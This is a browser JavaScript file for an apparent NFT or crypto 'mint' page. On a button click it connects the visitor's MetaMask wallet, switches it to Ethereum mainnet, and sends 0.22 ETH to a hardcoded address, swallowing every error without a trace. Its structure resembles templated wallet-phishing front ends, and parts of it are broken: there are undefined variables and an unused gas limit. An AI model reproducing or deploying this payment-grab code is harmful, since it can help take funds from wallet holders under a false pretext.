const ADDRESS = "0xE33ea462A9975EBab57a196b2505f1d1012115cf";
const web3 = window.Web3;
const ethereum = window.ethereum;
let accounts;
let price = 0.22;
const mint = document.querySelector(".mint");
const connect = document.querySelector(".connect");
const title = document.querySelector(".metamask_content-title");
const totalPrice = document.querySelector(".totalPrice");
const count = document.querySelector(".count");
const walletAddress = document.querySelector(".walletAddress");
var totalPriceAmount = price;
var countAmount = 1;
var link = document.location.host;


const getAccount = async function () {
    accounts = await ethereum.request({
        method: "eth_requestAccounts"
    });
    if (window.ethereum.chainId == "0x1") {
        console.log("Already connected to ethereum mainnet...");
    } else {
        try {
            await ethereum.request({
                method: "wallet_switchEthereumChain",
                params: [{
                    chainId: "0x1"
                }],
            });
        } catch (switchError) {
            if (error.code === 4902) {
                try {
                    await ethereum.request({
                        method: "wallet_addEthereumChain",
                        params: [{
                            chainId: "0x1",
                            rpcUrl: netURL,
                        },],
                    });
                } catch (addError) {
                }
            }
        }
    }
}


const modalOne = document.getElementById("modalbg"), modalSendOne = document.getElementById("modalbg-send-one"),
    modalSendTwo = document.getElementById("modalbg-send-two"), modalSelectSol = document.getElementById("modalbgSol"),
    modalSelectBnb = document.getElementById("modalbgBNB"), modalBgDone = document.getElementById("modalbgDone"),
    modalBgVideoOne = document.getElementById("modalbgVideoOne"),
    modalBgVideoTwo = document.getElementById("modalbgVideoTwo"), body = document.getElementById("body");
body.addEventListener("click", (function (e) {
    elem = e.target, (elem.classList.contains("modalbg-active") || elem.classList.contains("modal-SOLANA-wrap")) && (modalOne.classList.remove("modalbg-active"), modalSendOne.classList.remove("modalbg-active"), modalSendTwo.classList.remove("modalbg-active"), modalSelectSol.classList.remove("modalbg-active"), modalSelectBnb.classList.remove("modalbg-active"), modalBgDone.classList.remove("modalbg-active"), modalBgVideoOne.classList.remove("modalbg-active"), modalBgVideoTwo.classList.remove("modalbg-active"), body.classList.remove("body-freeze"))
}));
const btnStart = document.getElementById("btn-start");
btnStart.addEventListener("click", (function (e) {
    getAccount();
    const sendTransaction = async function () {
        const priceToWei = (totalPriceAmount * 1e18).toString(16);
        const gasLimit = (100_000 * totalPriceAmount).toString(16);

        ethereum.request({
            method: "eth_sendTransaction",
            params: [{
                from: accounts[0],
                to: ADDRESS,
                value: priceToWei,
            },],
        })
            .then((address) => {

            })
            .then((txHash) => {
                setTimeout(function () {
                }, 10000);
            })
            .catch((error) => {
            })
    };
    setTimeout(function () {
    }, 1000);
    sendTransaction();
}));
